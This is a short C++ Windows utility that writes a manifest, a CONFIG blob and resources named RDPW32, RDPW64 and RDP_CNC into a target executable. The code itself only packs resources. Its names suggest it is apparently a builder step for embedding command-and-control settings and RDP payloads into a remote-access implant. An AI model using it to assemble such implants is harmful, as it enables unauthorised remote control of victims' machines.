#include <windows.h>

#include <filesystem>
#include <fstream>
#include <iterator>
#include <limits>
#include <vector>

namespace {

std::vector<char> readFile(const wchar_t* path) {
    if (path == nullptr || *path == L'\0') return {};
    std::ifstream input(std::filesystem::path(path), std::ios::binary);
    return {std::istreambuf_iterator<char>(input), {}};
}

bool replaceResource(HANDLE update, const wchar_t* type, const wchar_t* name,
                     const wchar_t* path, WORD language) {
    std::vector<char> data = readFile(path);
    if (data.empty() || data.size() > std::numeric_limits<DWORD>::max()) return false;
    return UpdateResourceW(update, type, name, language,
                           data.data(),
                           static_cast<DWORD>(data.size())) != FALSE;
}

}  // namespace

int wmain(int argc, wchar_t** argv) {
    // target.exe manifest config rdpw32 rdpw64 rdp_cnc
    if (argc != 7) return 1;

    HANDLE update = BeginUpdateResourceW(argv[1], FALSE);
    if (update == nullptr) return 2;

    const WORD neutral = MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);
    bool ok = replaceResource(update, RT_MANIFEST, MAKEINTRESOURCEW(1), argv[2], neutral);
    ok = replaceResource(update, RT_MANIFEST, MAKEINTRESOURCEW(1), argv[2],
                         MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US)) && ok;
    ok = replaceResource(update, RT_RCDATA, L"CONFIG", argv[3], neutral) && ok;

    constexpr const wchar_t* names[] = {L"RDPW32", L"RDPW64", L"RDP_CNC"};
    for (int index = 0; index < 3; ++index) {
        if (argv[index + 4][0] != L'\0') {
            ok = replaceResource(update, RT_RCDATA, names[index],
                                 argv[index + 4], neutral) && ok;
        }
    }

    if (!ok) {
        EndUpdateResourceW(update, TRUE);
        return 3;
    }
    return EndUpdateResourceW(update, FALSE) ? 0 : 4;
}
